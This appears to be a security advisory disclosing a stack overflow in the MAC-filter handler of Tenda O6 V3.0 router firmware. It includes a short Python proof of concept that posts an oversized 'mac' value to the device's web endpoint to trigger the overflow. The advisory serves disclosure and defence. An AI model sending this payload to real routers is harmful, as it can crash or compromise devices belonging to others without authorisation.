## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3861.html

## Affected version

O6 V3.0 V1.0.0.7(2054)

## Vulnerability details

In the O6 V3.0 V1.0.0.7(2054) firmware has a stack overflow vulnerability in the `fromMacFilterModify` function. The `v1` variable receives the `mac` parameter from a POST request. However, since the user can control the input of `mac`, the statement `sscanf(v1, "%7[^:]:%7[^:]:%7[^:]:%7[^:]:%7[^:]:%7s", v46, v45, v44, v43, v42, v41);` can cause a buffer overflow. The user-provided  `nac` can exceed the capacity of the `v41~v46` array, triggering this security vulnerability.

![image-20240801133802434](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801133802434.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/operateMacFilter"
payload = b"a"*5000

data = {"mac": payload}
response = requests.post(url, data=data)
```
